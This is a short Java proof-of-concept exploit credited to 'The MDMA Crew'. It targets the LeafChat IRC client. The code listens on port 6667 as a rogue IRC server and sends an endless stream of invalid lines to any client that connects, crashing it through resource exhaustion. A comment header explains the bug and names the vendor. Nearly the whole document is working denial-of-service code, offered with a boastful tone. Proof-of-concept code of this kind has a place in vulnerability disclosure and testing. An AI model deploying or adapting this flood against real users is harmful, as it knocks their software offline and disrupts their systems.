/* The MDMA Crew's Proof-of-concept code for the DoS affecting LeafChat
 *
 * When the LeafChat IRC client recieves invalid data from the server, it
 * displays a dialog box with an error message. Should the server rapidly
 * send invalid messages, the system soon becomes dangerously low in
 * resources and commits harikiri. :-)
 *
 * Vendor Info: www.leafdigital.com/Software/leafChat
 * Crew Info: www.mdma.za.net || wizdumb@mdma.za.net
 */

import java.io.*;
import java.net.*;

class leafMeAlone {

// Line below will have to be changed for Microsoft's Java VM - oops ;P
static void main(String[] args) throws IOException, UnknownHostException {

    ServerSocket shervshoq = null;
    PrintWriter white = null;
    Socket shmoeshoq = null;

    shervshoq = new ServerSocket(6667);
    System.out.print("Now listening on Port 6667... ");

    try {
      shmoeshoq = shervshoq.accept();
      white = new PrintWriter(shmoeshoq.getOutputStream(), true);
    } catch (IOException e) {
      System.out.println("Errors accepting connection, y0");
      System.exit(1); }

    System.out.print("Connection recieved\nCrashing client... ");
    for (;;) {
      white.println(".");
      if (white.checkError()) {
      System.out.println("Crashed");
      break; } } } }


